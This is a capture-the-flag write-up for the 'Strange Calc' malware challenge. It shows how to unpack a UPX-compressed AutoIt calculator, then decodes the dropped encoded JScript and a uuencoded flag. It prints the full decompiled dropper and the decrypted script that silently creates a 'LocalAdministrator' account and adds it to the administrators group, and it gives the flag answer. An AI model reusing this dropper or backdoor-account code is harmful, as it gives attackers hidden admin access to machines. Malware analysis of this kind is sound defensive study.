Name: Strange Calc
Value: 459 points
Category: Malware
Solves: 92
Difficulty: medium
Author: @JohnHammond

Description:
I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run??

NOTE: Archive password is strange_calc

Download the file(s) below.
Attachments: calc.zip

Long Solution:

1. With the file downloaded extract the archive, I prefer 7-Zip

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc]
└─$ 7z x strange_calc.zip -pstrange_calc                          

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 200979 bytes (197 KiB)

Extracting archive: strange_calc.zip
--
Path = strange_calc.zip
Type = zip
Physical Size = 200979

Everything is Ok

Size:       206377
Compressed: 200979

2. Inspect the calc.exe file with file

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc]
└─$ file calc.exe 
calc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed, 3 sections

3. We see the file is UPX compressed, decompress with UPX

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc]
└─$ upx -d calc.exe                       
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    432169 <-    206377   47.75%    win32/pe     calc.exe

Unpacked 1 file.

4. Review the Strings of the file, looking for "flag" or other clues. In this case, we see that the file is an "AutoIt" script (highlighted for breviety)

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc]
└─$ strings calc.exe | grep Auto
            name="AutoIt3"
        <description>AutoIt v3</description>

5. Decompile the AutoIt script with AutoIt-Extractor (https://github.com/digitalsleuth/autoit-extractor/)

	a. Open the unpacked calc.exe on a Windows VM (I did not not test Wine)
	b. Select ">AUTOIT UNICODE SCRIPT<" in the Resources window
	c. Click "Save Resources"
	d. Open your saved text file

6. You will find the provided coded

; <AUT2EXE VERSION: 3.2.4.9>
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------
#NoTrayIcon
#Region
#AutoIt3Wrapper_Change2CUI=y
#EndRegion
;If Not IsAdmin() Then
;    MsgBox(16, "Error", "You must have administrator privileges.")
;    Exit
;EndIf
Local $a = "I0B+XmNRTUFBQT09VyF4XkRrS3hQbWAoYgk3bC5QMSdFRUJOJyggL2FWa0RjRS0JSippV1cuYzdsLlB/eCFwK0AhW2NWK1VMRHRJKzNRKgktbUQsMCc5JH9EUk0rMlZtbW5jSjcta1F1Jy9fZiZMfkVCKmlyMGNXY2tVTn9hcjZgRTh/b2tVRSoneCdaay0wIGJ4OSs2fTB2RSsJTkUjeyd4VC11MHt4J3JKIzFHVVlieCErSVxDLixveGA2IG00bC4vS04rKU92IWJPMisqW38yaTZXRHZcbS5QNCdxaTRAIVcgXit4VE90cHRfeypiCWIwdnRRJkAqeDZScysJTFk0Izguf2wzSS1tRH5re2M2Ul40bE1aVzkrek9gNCNSJnkjJ38yfkx7YzBjbXRtLi9XOSt6WWN0UXEqT2YgKid2Mn5WeHYwUl40bUQvVzluelljNF95I08yICondjJ+cyd2MCBeNGxEO0dOf2JZdjRRJipPMiBiW39mcG1RJ1VPRGJ4TCA2RFdoLzRsLlpLW39gY2JAIUAhICMtYE5AKkAqVyNiaWIwYzQzIEAhNiBWf3hvRDRSRiptMydqWS5yCW8gME1HOjt0Qy47V05uY3ZgJVs4WCpAIUAhVyMtYDNAKkAqeWIjcGtXYDRfZkAhNlJWf1VvRHRPOGJeX3s/RERyeEwgNkRHOjs0bE1aR1t/YGBjVkwmYkAhQCF/KnVzKjgpRCtERU1VUDFSZEUoL08uYnhvdlR+VCM4N0MuUHMncjRub3JVLHYqYyxSLQlNMW81YiwJSklSZmAiMXdgXUJ2dWIsO15xUiZ7MlMuT2YwL3YoLFtAIShjJiJ6Un8hSX5xS00tVXwneG54OUVpN2wufgknbGNoKmktbE1+Sycscnh/WVAhL38uUGRXXmxeYltoYnhra09EbVlXTX5FXwlfclAmbFtbcn5FeH9PUF5XXkNeb0RHO2FQQ05zcglrZEREbVlXTS8sSlcxbHNiOTpyVWIvWU1DWUtEUEpDW05yfnJtQ1ZeIH82bkpZSVxtRH4ye3grQX56bU9rN25vcjhOKzFZYEV/VV5EYndPUlV0bnNeQiNwV1dNYFxtLn47eyFwO0AhVyBzf3hMWTRSRnA7UVEqCXcgXSF4Y1ddNVl+VEIwbVYvfyMpMlIiRVVgSyQrREJGfjZDVmsrI3A0UkFCQUE9PV4jfkA="
Local $b = x($a)
Local $c = r(4) & r(2) & r(3) & r(1) & ".jse"
Func r($aa)
    Local $zz = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    Local $s = ""
    For $i = 1 To $aa
        $s &= StringMid($zz, Random(1, StringLen($zz), 1), 1)
    Next
    Return $s
EndFunc   ;==>r
Local $d = FileOpen($c, 2)
If $d = -1 Then
    MsgBox(16, "Error", "Failed to open the calculator.")
    Exit
EndIf
FileWrite($d, $b)
FileClose($d)
;FileSetAttrib($c, "+H")
;FileSetAttrib($c, "+S")
Func x($e)
    Local $f = DllStructCreate("dword")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", 0, _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Local $g = DllStructCreate("byte[" & DllStructGetData($f, 1) & "]")
    DllCall("crypt32.dll", "int", "CryptStringToBinaryA", _
            "str", $e, _
            "dword", StringLen($e), _
            "dword", 1, _
            "ptr", DllStructGetPtr($g), _
            "ptr", DllStructGetPtr($f), _
            "ptr", 0, _
            "ptr", 0)
    Return BinaryToString(DllStructGetData($g, 1))
EndFunc   ;==>x
$o = ObjCreate("MSScriptControl.ScriptControl")
$o.Language = "JScript"
$p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
$o.ExecuteStatement($p)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Users\johnh\Desktop\Desktop\otto_calculator.au3>
; ----------------------------------------------------------------------------

7. Defang the file by commenting out the following lines

;If Not IsAdmin() Then
;    MsgBox(16, "Error", "You must have administrator privileges.")
;    Exit
;EndIf

;FileSetAttrib($c, "+H")
;FileSetAttrib($c, "+S")

;$o = ObjCreate("MSScriptControl.ScriptControl")
;$o.Language = "JScript"
;$p = "new ActiveXObject('WScript.Shell').Run('wscript.exe " & $c & "',1,false);"
;$o.ExecuteStatement($p)

8. Allow the AutoIt script to be run on your sandbox, a file should appear in your working directory you should get a file name like:

	a. g39Gkt2PoF.jse

9. The content still appears to be encrypted, doing some research I came across this site that explained how to detect VBS/VBE/JSE encryption:

	a. https://master.ayra.ch/vbs/vbs.aspx#:~:text=VBS%20decrypter%20and%20encrypter.%20This%20site%20allows%20you%20to%20encrypt
	b. Detecting encrypted files
		You can check the file name extension, which should be .vbe, instead of .vbs.
		As an alternative you can open the file in a text editor.
		The content should start with #@~^XXXXXX== and end with ==^#~@ plus a "null" char, which is not visible in most editors.

10. Using John Hammond's VBE Decoder we can attempt to decrypt that file

	a. https://github.com/JohnHammond/vbe-decoder

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc]
└─$ ~/CTF/tools/malware-analysis/vbe-decoder/vbe-decoder.py ~/CTF/huntress2024/malware/strange_calc/g39Gkt2PoF.jse -o ~/CTF/huntress2024/malware/strange_calc/g39Gkt2PoF_decrypted.jse  
[+] success, wrote decoded vbscript to '/home/kali/CTF/huntress2024/malware/strange_calc/g39Gkt2PoF_decrypted.jse'


11. Review the decrypted JavaScript

function a(b){var c="",d=b.split("\n");for(var e=0;e<d.length;e++){var f=d[e].replace(/^\s+|\s+$/g,'');if(f.indexOf("begin")===0||f.indexOf("end")===0||f==="")continue;var g=(f.charCodeAt(0)-32)&63;for(var h=1;h<f.length;h+=4){if(h+3>=f.length)break;var i=(f.charCodeAt(h)-32)&63,j=(f.charCodeAt(h+1)-32)&63,k=(f.charCodeAt(h+2)-32)&63,l=(f.charCodeAt(h+3)-32)&63;c+=String.fromCharCode((i<<2)|(j>>4));if(h+2<f.length-1)c+=String.fromCharCode(((j&15)<<4)|(k>>2));if(h+3<f.length-1)c+=String.fromCharCode(((k&3)<<6)|l)}}return c.substring(0,g)}var m="begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";var n=a(m);var o=["net user LocalAdministrator "+n+" /add","net localgroup administrators LocalAdministrator /add","calc.exe"];var p=new ActiveXObject('WScript.Shell');for(var q=0;q<o.length-1;q++){p.Run(o[q],0,false)}p.Run(o[2],1,false);  

12. I asked ChatGPT to make the code easier to read, and was presented with the following:

function a(b) {
    var c = "",
        d = b.split("\n");

    for (var e = 0; e < d.length; e++) {
        var f = d[e].replace(/^\s+|\s+$/g, '');

        if (f.indexOf("begin") === 0 || f.indexOf("end") === 0 || f === "")
            continue;

        var g = (f.charCodeAt(0) - 32) & 63;

        for (var h = 1; h < f.length; h += 4) {
            if (h + 3 >= f.length) break;

            var i = (f.charCodeAt(h) - 32) & 63,
                j = (f.charCodeAt(h + 1) - 32) & 63,
                k = (f.charCodeAt(h + 2) - 32) & 63,
                l = (f.charCodeAt(h + 3) - 32) & 63;

            c += String.fromCharCode((i << 2) | (j >> 4));

            if (h + 2 < f.length - 1)
                c += String.fromCharCode(((j & 15) << 4) | (k >> 2));

            if (h + 3 < f.length - 1)
                c += String.fromCharCode(((k & 3) << 6) | l);
        }
    }

    return c.substring(0, g);
}

var m = "begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";
var n = a(m);

var o = [
    "net user LocalAdministrator " + n + " /add",
    "net localgroup administrators LocalAdministrator /add",
    "calc.exe"
];

var p = new ActiveXObject('WScript.Shell');

for (var q = 0; q < o.length - 1; q++) {
    p.Run(o[q], 0, false);
}

p.Run(o[2], 1, false);

13. inspecting "var m" it appears there is another encoded string present that appears to be UUENCODED

14. Using the following Python script we can decode that string

import uu
from io import BytesIO

# Correcting the formatting by replacing "\n" with actual newlines
uu_encoded_data = """begin 644 -
G9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*
end"""

# Convert the string into a file-like object
input_data = BytesIO(uu_encoded_data.encode())
output_data = BytesIO()

# Decode the uuencoded string
uu.decode(input_data, output_data)

# Get the decoded output
decoded_result = output_data.getvalue().decode()

print("Decoded Result:", decoded_result)

15. python3 decode_uuencode.py

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc]
└─$ python3 decode_uuencode.py                 
/home/kali/CTF/huntress2024/malware/strange_calc/decode_uuencode.py:1: DeprecationWarning: 'uu' is deprecated and slated for removal in Python 3.13
  import uu
Decoded Result: flag{9922fb21aaf1757e3fdb28d7890a5d93}

16. Grep for the Flag

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/strange_calc_COMPLETED]
└─$ python3 -W ignore decode_uuencode.py | grep -oE 'flag\{.*?\}' --color=none

flag{9922fb21aaf1757e3fdb28d7890a5d93}

17. Flag: flag{9922fb21aaf1757e3fdb28d7890a5d93}

Short Solution:

1. Upload calc.exe to https://www.tria.ge: https://tria.ge/241001-2hphqaxeqe/behavioral1
2. Download the .jse file dropped, in this case: 6FV9R6jqai.jse
3. Perform steps 11-16 from the long solution.